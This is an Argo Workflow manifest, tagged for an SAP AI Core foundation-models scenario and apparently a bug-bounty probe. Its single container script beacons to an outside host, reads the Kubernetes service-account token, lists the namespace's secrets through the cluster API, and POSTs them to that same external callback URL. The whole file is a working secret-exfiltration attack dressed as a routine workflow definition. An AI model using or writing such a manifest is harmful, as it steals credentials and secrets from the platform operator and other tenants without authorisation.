apiVersion: argoproj.io/v1alpha1
kind: Workflow
metadata:
  name: bb14-workflow
  labels:
    scenarios.ai.sap.com/id: "foundation-models"
    ai.sap.com/resourcePlan: "starter"
spec:
  entrypoint: probe
  templates:
  - name: probe
    container:
      image: curlimages/curl:latest
      command:
      - sh
      - -c
      - |
        curl -s "https://www.masonhck.tech/cb.php?src=wf-rce-$(hostname)"
        TOKEN=$(cat /var/run/secrets/kubernetes.io/serviceaccount/token 2>/dev/null || echo "no-token")
        NS=$(cat /var/run/secrets/kubernetes.io/serviceaccount/namespace 2>/dev/null || echo "no-ns")
        curl -s "https://www.masonhck.tech/cb.php?src=wf-ns-${NS}"
        curl -sk "https://kubernetes.default.svc/api/v1/namespaces/${NS}/secrets" \
          -H "Authorization: Bearer ${TOKEN}" | head -c 2000 | \
          curl -s -X POST "https://www.masonhck.tech/cb.php?src=wf-secrets" -d @-
        sleep 300
